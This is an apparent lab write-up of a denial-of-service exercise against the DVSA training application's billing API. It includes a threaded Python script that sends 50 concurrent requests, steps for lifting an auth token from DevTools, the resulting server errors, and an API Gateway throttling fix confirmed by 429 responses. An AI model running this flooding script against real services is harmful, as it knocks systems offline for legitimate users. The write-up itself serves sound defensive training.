# Evidence – Lesson 6 (Denial of Service)

---

## 1. Environment Setup

* API Endpoint:

```
https://jg71b5i888.execute-api.us-east-1.amazonaws.com/dvsa/order
```

* Lambda Function:

```
DVSA-ORDER-BILLING
```

* CloudWatch Log Group:

```
/aws/lambda/DVSA-ORDER-BILLING
```

* Tools Used:
* Python 3
* requests library
* AWS Console
* CloudWatch Logs

---

## 2. Attack Script (DoS)

The following script was used to simulate a Denial of Service attack by sending 50 concurrent requests:

```python
import threading
import requests

API_URL = "https://jg71b5i888.execute-api.us-east-1.amazonaws.com/dvsa/order"
ORDER_ID = "id"
JWT_TOKEN = "token"
CREDIT_CARD = "4242424242424242"

def send_billing_request():
    payload = {
        "action": "billing",
        "order-id": ORDER_ID,
        "data": {"ccn": CREDIT_CARD}
    }

    headers = {
        "authorization": JWT_TOKEN,
        "content-type": "application/json"
    }

    try:
        response = requests.post(API_URL, json=payload, headers=headers)
        print(f"Response: {response.status_code} - {response.text[:100]}")
    except Exception as e:
        print(f"Error: {e}")

print("Starting DoS attack...")

threads = []

for i in range(50):
    t = threading.Thread(target=send_billing_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Attack complete!")
```

---

## 3. Attack Steps

1. Log into DVSA application
2. Add an item to cart
3. Proceed to checkout to generate an order ID
4. Open DevTools → Network tab
5. Copy:

   * Authorization token
   * order-id
6. Update the script with:

   * API_URL
   * ORDER_ID
   * JWT_TOKEN
7. Run the script:

```bash
python attack.py
```

---

## 4. Results (Before Fix)

The attack generated multiple responses:

```
500 Internal Server Error
502 Bad Gateway
200 "order already made"
```

### Explanation

* **500 Internal Server Error** → Lambda crashed under heavy load
* **502 Bad Gateway** → API Gateway overwhelmed
* **200 OK** → Some requests succeeded before crash

This confirms that the endpoint was flooded successfully.

---

## 5. Additional Evidence

### API Gateway Configuration (Before Fix)

```
Rate: 10000 requests/sec
Burst: 5000
```

➡️ No throttling or rate limiting was applied.

---

## 6. Impact

* Lambda execution time increased significantly
* Backend became unstable
* Service unavailable for legitimate users
* System vulnerable to resource exhaustion

---

## 7. Fix Applied

The fix was implemented at API Gateway level.

### Location

```
API Gateway → DVSA-APIS → Stages → dvsa → Throttling Settings
```

### New Configuration

```
Rate: 10 requests/sec
Burst: 20
```

This limits incoming traffic before reaching Lambda.

---

## 8. Verification (After Fix)

The same attack script was executed again.

### Result

```
429 Too Many Requests
```

### Explanation

* Requests exceeding the limit are rejected
* Lambda is protected from overload
* System remains stable

---

## 9. Analysis

### Table A — Behavior

| Vulnerability | Intended Rule                     | Normal Behavior               | Exploit Behavior                   |
| ------------- | --------------------------------- | ----------------------------- | ---------------------------------- |
| DoS           | Limit number of requests per user | Single request returns 200 OK | Multiple requests crash the system |

---

### Table B — Deviation & Fix

| Issue            | Cause            | Fix               | Result                 |
| ---------------- | ---------------- | ----------------- | ---------------------- |
| No rate limiting | Misconfiguration | Enable throttling | Requests limited (429) |

---

## 10. Conclusion

Before fix:

* Unlimited requests allowed
* Lambda crashed
* Service became unavailable

After fix:

* Requests controlled
* Attack blocked
* System stable

---

## 11. Screenshot

See:

```
/Evidence/dos-attack.png
```

---

## Key Takeaway

> Without rate limiting, any public API can be easily overwhelmed.

Always:

* Apply throttling
* Limit request rate
* Protect backend services from abuse
